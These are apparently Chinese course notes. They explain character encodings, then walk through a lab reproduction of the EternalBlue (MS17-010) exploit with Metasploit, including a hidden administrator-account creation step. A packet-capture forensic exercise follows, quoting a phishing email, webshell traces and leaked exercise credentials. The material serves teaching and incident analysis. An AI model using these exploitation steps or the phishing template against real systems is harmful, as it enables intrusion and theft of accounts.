<p>为了较好的解决<code>Unicode</code>的编码问题，<code>UTF-8</code>和<code>UTF-16</code>两种当前比较流行的编码方式诞生了。当然还有一个<code>UTF-32</code>的编码方式，也就是上述那种定长编码，字符统一使用 4 个字节，虽然看似方便，但是却不如另外两种编码方式使用广泛。</p>
<h5 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h5><p><code>UTF-8</code>实现了对<code>ASCII</code>码的向后兼容，以保证<code>Unicode</code>可以被大众接受。</p>
<p><code>UTF-8</code>是目前互联网上使用最广泛的一种<code>Unicode</code>编码方式，它的最大特点就是可变长。它可以使用<code>1 - 4</code>个字节表示一个字符，根据字符的不同变换长度。编码规则如下：</p>
<ol>
<li>对于单个字节的字符，第一位设为 0，后面的 7 位对应这个字符的 Unicode 码点。因此，对于英文中的 0 - 127 号字符，与 ASCII 码完全相同。这意味着 ASCII 码那个年代的文档用 UTF-8 编码打开完全没有问题。</li>
<li>对于需要使用 N 个字节来表示的字符（N &gt; 1），第一个字节的前 N 位都设为 1，第<code>N + 1</code>位设为0，剩余的<code>N - 1</code>个字节的前两位都设位 10，剩下的二进制位则使用这个字符的 Unicode 码点来填充。</li>
</ol>
<p>编码规则如下：</p>
<table>
<thead>
<tr>
<th align="left">Unicode 十六进制码点范围</th>
<th align="left">UTF-8 二进制</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0000 0000 - 0000 007F</td>
<td align="left">0xxxxxxx</td>
</tr>
<tr>
<td align="left">0000 0080 - 0000 07FF</td>
<td align="left">110xxxxx 10xxxxxx</td>
</tr>
<tr>
<td align="left">0000 0800 - 0000 FFFF</td>
<td align="left">1110xxxx 10xxxxxx 10xxxxxx</td>
</tr>
<tr>
<td align="left">0001 0000 - 0010 FFFF</td>
<td align="left">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
</tr>
</tbody></table>
<h5 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h5><p>在了解<code>UTF-16</code>编码方式之前，先了解一下另外一个概念——**”平面”**。</p>
<p>在上面的介绍中，提到了<code>Unicode</code>是一本很厚的字典，她将全世界所有的字符定义在一个集合里。这么多的字符不是一次性定义的，而是分区定义。每个区可以存放 65536 个（$2^{16}$）字符，称为一个平面（plane）。目前，一共有 17 个（$2^{5}$）平面，也就是说，整个 Unicode 字符集的大小现在是 $2^{21}$。</p>
<p>最前面的 65536 个字符位，称为基本平面（简称 BMP ），它的码点范围是从 0 到 $2^{16}-1$，写成 16 进制就是从 U+0000 到 U+FFFF。所有最常见的字符都放在这个平面，这是 Unicode 最先定义和公布的一个平面。剩下的字符都放在辅助平面（简称 SMP ），码点范围从 U+010000 到 U+10FFFF。</p>
<p>基本了解了平面的概念后，再说回到 UTF-16。UTF-16 编码介于 UTF-32 与 UTF-8 之间，同时结合了定长和变长两种编码方法的特点。它的编码规则很简单：基本平面的字符占用 2 个字节，辅助平面的字符占用 4 个字节。也就是说，UTF-16 的编码长度要么是 2 个字节（U+0000 到 U+FFFF），要么是 4 个字节（U+010000 到 U+10FFFF）。那么问题来了，当我们遇到两个字节时，到底是把这两个字节当作一个字符还是与后面的两个字节一起当作一个字符呢？</p>
<p>这里有一个很巧妙的地方，在基本平面内，从 <strong>U+D800</strong> 到 <strong>U+DFFF</strong> 是一个空段，即这些码点不对应任何字符。因此，这个空段可以用来映射辅助平面的字符。</p>
<p>辅助平面的字符位共有 $2^{20}$ 个，因此表示这些字符至少需要 20 个二进制位。UTF-16 将这 20 个二进制位分成两半，前 10 位映射在 U+D800 到 U+DBFF，称为高位（H），后 10 位映射在 U+DC00 到 U+DFFF，称为低位（L）。这意味着，一个辅助平面的字符，被拆成两个基本平面的字符表示。</p>
<p>因此，当我们遇到两个字节，发现它的码点在 U+D800 到 U+DBFF 之间，就可以断定，紧跟在后面的两个字节的码点，应该在 U+DC00 到 U+DFFF 之间，这四个字节必须放在一起解读。</p>
<p>接下来，以汉字”𠮷”为例，说明 UTF-16 编码方式是如何工作的。</p>
<p>汉字”𠮷”的 Unicode 码点为 <code>0x20BB7</code>，该码点显然超出了基本平面的范围（0x0000 - 0xFFFF），因此需要使用四个字节表示。首先用 <code>0x20BB7 - 0x10000</code> 计算出超出的部分，然后将其用 20 个二进制位表示（不足前面补 0 ），结果为<code>0001000010 1110110111</code>。接着，将前 10 位映射到 U+D800 到 U+DBFF 之间，后 10 位映射到 U+DC00 到 U+DFFF 即可。<code>U+D800</code> 对应的二进制数为 <code>1101100000000000</code>，直接填充后面的 10 个二进制位即可，得到 <code>1101100001000010</code>，转成 16 进制数则为 <code>0xD842</code>。同理可得，低位为 <code>0xDFB7</code>。因此得出汉字”𠮷”的<code>UTF-16</code>编码为 <code>0xD842 0xDFB7</code>。</p>
<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p><code>base64</code>编码的数据转换成二进制每个字符只有<code>8</code>位，那么<code>base64</code>编码表就共有<code>2^8</code>即<code>64</code>个对应：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/2000534-f4d27b41c1297902.png"></p>
<p>下面用一个例子来说明加密的过程：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">- 首先取ABC对应的ASCII码值</span><br><span class="line">A : 65、B : 66、C : 67</span><br><span class="line">- 再取二进制值</span><br><span class="line">A : 01000001、B : 01000010、C : 01000011</span><br><span class="line">- 然后把这三个字节的二进制码接起来</span><br><span class="line">010000010100001001000011</span><br><span class="line">- 再以6位为单位分成4个数据块并在最高位填充两个0后形成4个字节的编码后的值</span><br><span class="line">00010000、00010100、00001001、00000011</span><br><span class="line">- 再把这4个字节数据转化成10进制数</span><br><span class="line">16、20、19、3</span><br><span class="line">- 最后根据Base64给出的64个基本字符表，查出对应的ASCII码字符</span><br><span class="line">Q、U、J、D</span><br><span class="line">这里的值实际就是数据在字符表中的索引。</span><br><span class="line">解码过程就是把4个字节再还原成3个字节再根据不同的数据形式把字节数组重新整理成数据。</span><br></pre></td></tr></table></figure>

<p>这样的话，<code>3</code>个普通字符就可以编码成<code>4</code>个<code>base64</code>编码后的字符，所以我们通常是以<code>4</code>个编码字符为单位的。</p>
<p>当<code>n=0 mod 3</code>时：可以完全编码成<code>base64</code>字符。</p>
<p>当<code>n=1 mod 3</code>时：第一个字符的前<code>6</code>位二进制被编码成一个<code>base64</code>字符，剩下的两位用<code>0</code>补齐之后再编码成<code>base64</code>字符。因为是以<code>4</code>个为单位，缺的用<code>=</code>补齐。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">010000 010000</span><br><span class="line">QQ==</span><br></pre></td></tr></table></figure>

<p>当<code>n=2 mod 3</code>时：共<code>8*2=16</code>位二进制，编码后剩下<code>2</code>位用<code>0</code>补齐进行编码，则就有<code>3</code>个编码字符串了。然后再用<code>=</code>凑齐<code>4</code>个。</p>
<p>解码时原理一样。</p>
<h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><p><code>ASCII</code>码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数，剩下的1位二进制为0）来表示所有的大写和小写字母，数字0 到9、标点符号，以及在美式英语中使用的特殊控制字符。</p>
<p>0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），如控制符：<code>LF</code>（换行）、<code>CR</code>、<code>FF</code>（换页）、<code>DEL</code>（删除）、<code>BS</code>（退格)、<code>BEL</code>（响铃）等；通信专用字符：<code>SOH</code>（文头）、<code>EOT</code>（文尾）、<code>ACK</code>（确认）等；ASCII值为8、9、10 和13 分别转换为退格、制表、换行和回车字符。它们并没有特定的图形显示，但会依不同的应用程序，而对文本显示有不同的影响 。</p>
<p><code>32～126</code>(共95个)是字符（32是空格），其中<code>48～57</code>为0到9十个阿拉伯数字。</p>
<p><code>65～90</code>为26个大写英文字母，<code>97～122</code>号为26个小写英文字母，其余为一些标点符号、运算符号等。</p>
<p>后<code>128</code>个称为拓展<code>ascii</code>码。许多基于<code>x86</code>的系统都支持使用扩展<code>ASCII</code>。扩展<code>ASCII</code>码允许将每个字符的第8 位用于确定附加的<code>128 </code>个特殊符号字符、外来语字母和图形符号。小写字母的<code>ASCII</code>码值比大写字母<code>ASCII</code>码值大<code>32</code>。</p>
<h3 id="url-编码"><a href="#url-编码" class="headerlink" title="url 编码"></a>url 编码</h3><p><code>URL</code>编码遵循下列规则：每对<code>name/value</code>由<code>&amp;;</code>符分开；每对来自表单的<code>name/value</code>由=符分开，如果用户没有输入值给这个<code>name</code>，那么这个<code>name</code>还是出现，只是无值。任何特殊的字符（就是那些不是简单的七位<code>ASCII</code>，如汉字）将以百分符<code>%</code>用十六进制编码，当然也包括象 <code>=,&amp;;</code>和<code>%</code>这些特殊的字符。其实<code>url</code>编码就是一个字符<code>ascii</code>码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如<code>\</code>，它的<code>ascii</code>码是<code>92</code>，<code>92</code>的十六进制是<code>5c</code>，所以<code>\</code>的<code>url</code>编码就是<code>%5c</code>。</p>
<p>简单来讲，<code>url</code>编码是<code>%</code>+<code>ascii</code>码的十六进制表示形式。目的是为了防止<code>url</code>内的特殊字符引起歧义。</p>
<h2 id="ms17-010-永恒之蓝-漏洞复现"><a href="#ms17-010-永恒之蓝-漏洞复现" class="headerlink" title="ms17-010(永恒之蓝)漏洞复现"></a>ms17-010(永恒之蓝)漏洞复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul>
<li>虚拟机环境：VMware Workstation 16 pro</li>
<li>网络模式：NAT</li>
<li>攻击机：kali Linux  IP：192.168.204.133</li>
<li>靶机：Windows 7 X64 IP：192.168.204.131</li>
</ul>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>通过nmap对192.168.204.0/24 这个网段扫描发现是否有存在ms17-010漏洞的主机。</p>
<ol>
<li>找到nmap关于ms17-010的扫描脚本</li>
</ol>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210215527241.png" alt="image-20201210215527241"></p>
<p>指令说明：</p>
<ul>
<li>whereis 用于查找文件</li>
<li>locate 用于查找符合条件的文档，这里就是查找包含ms17-010的文件的路径</li>
</ul>
<ol start="2">
<li>使用脚本扫描整个网段</li>
</ol>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210220203102.png" alt="image-20201210220203102"></p>
<p>找到了有ms17-010漏洞的主机，也就是设定的靶机。</p>
<h4 id="使用Metasploit进行攻击（渗透攻击阶段）"><a href="#使用Metasploit进行攻击（渗透攻击阶段）" class="headerlink" title="使用Metasploit进行攻击（渗透攻击阶段）"></a>使用Metasploit进行攻击（渗透攻击阶段）</h4><ol>
<li><p>进入msf框架，找到ms17-010攻击模块。</p>
<p>1.1 输入<code>msfconsole</code>启动Metasploit</p>
</li>
</ol>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210220714731.png" alt="image-20201210220714731"></p>
<p>​    1.2 输入<code>search ms17-010</code>查找永恒之蓝漏洞</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221132117.png" alt="image-20201210221132117"></p>
<p>可以看到有5个模块，其中auxiliary/scanner/smb/smb_ms17_010是扫描MS17-010永恒之蓝的模块，扫描或者说检查目标主机是否存在MS17-010永恒之蓝的漏洞（上文已使用nmap进行扫描）。exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码的模块.</p>
<ol start="2">
<li><p>使用ms17-010攻击模块，对靶机Win7进行攻击</p>
<p>1.1 输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>，进入攻击模块</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221416159.png" alt="image-20201210221416159"></p>
<p>1.2输入<code>options</code> 查看需要设置的内容<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221535375.png" alt="image-20201210221535375"></p>
<p>1.3设置目标主机的IP<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221905461.png" alt="image-20201210221905461"></p>
<p>1.4设置payload（攻击载荷）<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210222413306.png" alt="image-20201210222413306"></p>
<p>选择与目标主机建立反向连接，输入<code>run</code>开始攻击。</p>
<p>成功后，输入shell。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230012261.png" alt="image-20201210230012261"></p>
<p>这里出现错误，上网查找后升级更新解决问题。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230156170.png" alt="image-20201210230156170"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230115985.png" alt="image-20201210230115985"></p>
</li>
</ol>
<h4 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h4><p>   创建一个用户并提权为管理员。</p>
<ol>
<li><p>创建用户</p>
<p>输入<code>net user test test /add</code>，创建一个名为test，密码为test的普通用户。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232006046.png" alt="image-20201210232006046"></p>
<ol start="2">
<li><p>提升权限</p>
<p>输入<code>net localgroup administrators test /add    </code>。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232719373.png" alt="image-20201210232719373"></p>
</li>
</ol>
</li>
</ol>
<pre><code>   3. 验证</code></pre>
<p>   <img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232748811.png" alt="image-20201210232748811"></p>
<h1 id="作业二"><a href="#作业二" class="headerlink" title="作业二"></a>作业二</h1><h2 id="1-数据分析"><a href="#1-数据分析" class="headerlink" title="1 数据分析"></a>1 数据分析</h2><h2 id="练习题目-2"><a href="#练习题目-2" class="headerlink" title="练习题目 2"></a>练习题目 2</h2><p>整个题目数据包只有两个，比较少。为了方便分析，先将两个数据包合并。</p>
<p>首先，【统计】——【协议分级】查看一下整体的协议状态。</p>
<p>可以看到主要是http协议、少量的smtp</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212211548300.png" alt="image-20201212211548300"></p>
<p>然后【统计】——【http】——【请求】查看http的请求情况。</p>
<p>在关于网站crm.t3sec.cc:8081的请求中可以清楚的看到<code>vulnweb.com </code>、<code>acunetix</code>等特征,可以判断使用了<code>awvs</code>进行扫描。同时还有sql注入的操作，猜测使用sqlmap，筛选一下<code>tcp contains sqlmap</code>.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212212054188.png" alt="image-20201212212054188"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212231459988.png" alt="image-20201212231459988"></p>
<p>使用<code>http contains acunetix </code>筛选</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212212310598.png" alt="image-20201212212310598"></p>
<p>可以判断攻击者的IP为111.206.82.164。</p>
<p>继续筛选一些比较敏感的http请求，比如登录，且IP锁定为攻击者。使用<code>http contains login &amp;&amp; ip.src== 111.206.82.164</code>.</p>
<p>发现111.206.82.164有大量的登录请求。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212213116536.png" alt="image-20201212213116536"></p>
<p>随便找一个，具体查看</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212213337698.png"></p>
<p>可以知道内网<code>ip</code>中<code>172.16.61.206</code>对应的外网<code>host</code>为<code>http://crm.t3sec.cc:8081</code>。</p>
<p>更进一步过滤攻击者的攻击操作。使用<code>ip.dst == 172.16.61.206 &amp;&amp; http &amp;&amp; ip.src == 111.206.82.164 &amp;&amp; http</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212213819469.png" alt="image-20201212213819469"></p>
<p>应该是在进行爆破。</p>
<p>继续之前的<code>http contains login &amp;&amp; ip.src== 111.206.82.164</code>.可以发现，还有登录<code>172.16.60.200</code>的操作，根据url判断这应该是一个<code>webmail</code>登录服务器。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212214148017.png" alt="image-20201212214148017"></p>
<p>可以发现攻击者在尝试登录邮箱。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212214731854.png" alt="image-20201212214731854"></p>
<p>进一步将范围放大，查看<code>http &amp;&amp; ip.src== 111.206.82.164</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212215231335.png" alt="image-20201212215231335"></p>
<p>可以发现使用cookie中带有<code>lixiaofei@t3sec.cc</code>，猜测已经被窃取了账户。进一步查看回显。<code>http &amp;&amp; ip.addr== 111.206.82.164</code>可以发现登录成功。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212220532176.png" alt="image-20201212220532176"></p>
<p>在附近，可以找到登录成功后显示的界面。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212221215012.png" alt="image-20201212221215012"></p>
<p>所以，确定攻击者得到了<code>lixiaofei@t3sec.com</code>的账户。同理可以知道<a href="mailto:&#105;&#x74;&#x40;&#x74;&#51;&#x73;&#101;&#99;&#x2e;&#x63;&#x63;">&#105;&#x74;&#x40;&#x74;&#51;&#x73;&#101;&#99;&#x2e;&#x63;&#x63;</a>已被窃取。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212222146833.png" alt="image-20201212222146833"></p>
<p>继续筛选攻击者的攻击行为<code>ip.src == 111.206.82.164 &amp;&amp; http &amp;&amp; not(ip.dst == 172.16.61.206) &amp;&amp; not(ip.dst == 172.16.60.200)</code>。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212222611338.png" alt="image-20201212222611338"></p>
<p>可以得到两条映射关系。</p>
<p>继续过滤为post。<code>ip.src == 111.206.82.164 &amp;&amp; http &amp;&amp; not(ip.dst == 172.16.61.206) &amp;&amp; not(ip.dst == 172.16.60.200) &amp;&amp; http.request.method == &quot;POST&quot;</code></p>
<p>发现对发现有对<code>172.16.61.199</code>的登录和文件上传操作。上传的文件php，追踪流可以看到内容。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212223943018.png" alt="image-20201212223943018"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212223546925.png" alt="image-20201212223546925"></p>
<p>是一个大马，说明拿到了<code>172.16.61.199</code>的权限。结合之前的登录操作，可以知道泄露的账号：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">username: lixiaofei</span><br><span class="line">passwd	: lixiaofei</span><br><span class="line">username: admin</span><br><span class="line">passwd	: admin888</span><br></pre></td></tr></table></figure>

<p>接下是查看SMTP协议。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224125405.png" alt="image-20201212224125405"></p>
<p>可以发现，主要有两个邮箱发送邮件。<a href="mailto:&#120;&#x73;&#x73;&#x65;&#x72;&#64;&#x6c;&#x69;&#118;&#101;&#x2e;&#99;&#x6e;">&#120;&#x73;&#x73;&#x65;&#x72;&#64;&#x6c;&#x69;&#118;&#101;&#x2e;&#99;&#x6e;</a>和clickjacking@163.com。</p>
<p>分别追踪tcp流</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224338790.png" alt="image-20201212224338790"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224909181.png" alt="image-20201212224909181"></p>
<p>发现都是将钓鱼邮件发送给了<code>it@t3sec.com</code>和<code>lixiaofei@t3sec.cn</code>，而且邮件内容一致，如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=gb2312&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="xml"><span class="comment">&lt;!-- P &#123;margin-top:0;margin-bottom:0;&#125; --&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">dir</span>=<span class="string">&quot;ltr&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divtagdefaultwrapper&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:12pt;color:#000000;background-color:#FFFFFF;font-family:Calibri,Arial,Helvetica,sans-serif;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;line-height:1.7;color:#000000;font-size:14px;font-family:Arial&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>大家好。<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span> 鉴于公司网络架构改动，部分应用需要升级，旧版本mail、oa、crm等系统逐步将替换，请大家登录<span class="tag">&lt;<span class="name">a</span> <span class="attr">_src</span>=<span class="string">&quot;http://118.194.196.232:8084/get.php&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://118.194.196.232:8084/get.php&quot;</span>&gt;</span>http://118.194.196.232:8084/get.php<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 填写自己的帐号以便配合系统升级。</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span> 谢谢大家！ <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>钓鱼邮件中的<code>118.194.196.232:8084</code>由之前发现映射关系可以知道对应内网的<code>172.16.60.195:80</code>。</p>
<p>如果用户点击了钓鱼邮件中的链接的话，对于<code>172.16.60.195:80</code>请求头中肯定会携带<code>webmail</code>的<code>cookie</code>，过滤一下对<code>172.16.60.195:80</code>的请求。</p>
<p><code>(ip.src == 111.206.82.164 &amp;&amp; http &amp;&amp; ip.dst == 172.16.60.195) || (ip.dst == 111.206.82.164 &amp;&amp; http &amp;&amp; ip.src == 172.16.60.195)</code>。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212225432765.png" alt="image-20201212225432765"></p>
<p>可以发现由session有<a href="mailto:&#x6c;&#x69;&#x78;&#x69;&#x61;&#x6f;&#x66;&#101;&#x69;&#x40;&#116;&#x33;&#x73;&#x65;&#x63;&#46;&#99;&#99;">&#x6c;&#x69;&#x78;&#x69;&#x61;&#x6f;&#x66;&#101;&#x69;&#x40;&#116;&#x33;&#x73;&#x65;&#x63;&#46;&#99;&#99;</a>，it@t3sec.cc。且 显示的源地址是<code>111.206.82.164</code>是攻击机，说明被劫持了。在途中的<code>POST</code>请求中的账号密码也被窃取<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212225710772.png" alt="image-20201212225710772"></p>
<p>到这里，就可以回答问题了。</p>
<ul>
<li>黑客的攻击ip是多少，被攻击的内网IP是多少？</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">黑客攻击ip：111.206.82.164</span><br><span class="line">被攻击的内网ip：172.16.61.206，172.16.61.199，172.16.61.200</span><br></pre></td></tr></table></figure>

<ul>
<li>哪些帐号被黑客窃取了(填写帐号名)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">it@t3sec.cc,admin,lixiaofei</span><br></pre></td></tr></table></figure>

<ul>
<li> 黑客的服务器ip是多少</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">111.206.82.164</span><br></pre></td></tr></table></figure>

<ul>
<li>黑客使用了什么工具？</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awvs、sqlmap、angel.php(大马)</span><br></pre></td></tr></table></figure>

<ul>
<li>黑客给哪2个帐号发送了钓鱼邮件？</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">lixiaofei@t3sec.cc</span><br><span class="line">it@t3sec.cc</span><br></pre></td></tr></table></figure>

<ul>
<li>黑客伪造的邮件标题和内容是什么？</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">标题：系统升级，请大家注意</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot; style=&quot;display:none;&quot;&gt;&lt;!-- P &#123;margin-top:0;margin-bottom:0;&#125; --&gt;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body dir=&quot;ltr&quot;&gt;</span><br><span class="line">&lt;div id=&quot;divtagdefaultwrapper&quot; style=&quot;font-size:12pt;color:#000000;background-color:#FFFFFF;font-family:Calibri,Arial,Helvetica,sans-serif;&quot;&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;div style=&quot;line-height:1.7;color:#000000;font-size:14px;font-family:Arial&quot;&gt;</span><br><span class="line">&lt;div&gt;大家好。&lt;br&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 鉴于公司网络架构改动，部分应用需要升级，旧版本mail、oa、crm等系统逐步将替换，请大家登录&lt;a _src=&quot;http://118.194.196.232:8084/get.php&quot; href=&quot;http://118.194.196.232:8084/get.php&quot;&gt;http://118.194.196.232:8084/get.php&lt;/a&gt; 填写自己的帐号以便配合系统升级。</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp; 谢谢大家！ &lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;span&gt;&lt;/span&gt;&lt;br&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>黑客使用了哪个邮箱给员工发送了钓鱼邮件？</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">两个邮箱：</span><br><span class="line">xsser@live.cn</span><br><span class="line">clickjacking@163.com</span><br></pre></td></tr></table></figure>

<ul>
<li>哪两个员工点开了黑客的<code>email</code>链接(填写员工<code>email</code>地址)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">it@t3sec.cc</span><br><span class="line">lixiaofei@t3sec.cc</span><br></pre></td></tr></table></figure>

<ul>
<li>请指出黑客使用的扫描器指纹是什么？(简称)</li>
</ul>
<table>
<thead>
<tr>
<th align="left">扫描器指纹</th>
<th align="left">扫描器</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>vulnweb</code>, <code>acunetix</code>,<code>acunetix_wvs_test</code>,<code>acunetix/wvs</code>,<code>acunetix_test</code></td>
<td align="left"><code>awvs</code></td>
</tr>
<tr>
<td align="left"><code>sqlmap</code></td>
<td align="left"><code>sqlmap</code></td>
</tr>
<tr>
<td align="left"><code>eval</code>,<code>pass</code></td>
<td align="left"><code>angel.php</code></td>
</tr>
</tbody></table>
<h2 id="铁人三项数据分析题目"><a href="#铁人三项数据分析题目" class="headerlink" title="铁人三项数据分析题目"></a>铁人三项数据分析题目</h2><p>发现数据包包括了练习题目2的数据包，且问题一致。于是其他的包，主要筛选出除了已经出现的IP的其他的IP。</p>
<ul>
<li>数据采集D_eth0_NS_20160804_091808</li>
</ul>
